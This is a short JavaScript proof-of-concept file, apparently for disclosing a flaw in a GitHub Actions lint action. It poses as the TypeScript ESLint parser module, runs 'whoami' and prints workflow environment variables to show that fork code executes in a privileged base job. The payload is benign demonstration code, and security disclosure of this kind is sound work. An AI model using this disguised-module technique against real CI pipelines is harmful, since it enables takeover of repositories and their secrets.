// GENUINE CROSS-FORK PoC. This file exists ONLY on the fork (IslamBatsh/lint-rce-repro) head,
// and is ABSENT on the base (pwnhaven-afk/lint-rce-repro). Its execution under pull_request_target
// proves lint-action fetched + checked out the fork head into the privileged base job.
module.exports = (() => {
  const cp = require("child_process");
  let who = ""; try { who = cp.execSync("whoami").toString().trim(); } catch (e) { who = "err"; }
  console.log("=== LINT_ACTION_PRT_CROSSFORK_RCE_POC ===");
  console.log("proof: FORK-HEAD parser executed in base job via node require()");
  console.log("whoami: " + who);
  console.log("GITHUB_EVENT_NAME: " + process.env.GITHUB_EVENT_NAME);
  console.log("GITHUB_REPOSITORY (base job): " + process.env.GITHUB_REPOSITORY);
  console.log("file origin: fork head only; absent on base");
  console.log("=== END LINT_ACTION_PRT_CROSSFORK_RCE_POC ===");
  return require("@typescript-eslint/parser");
})();
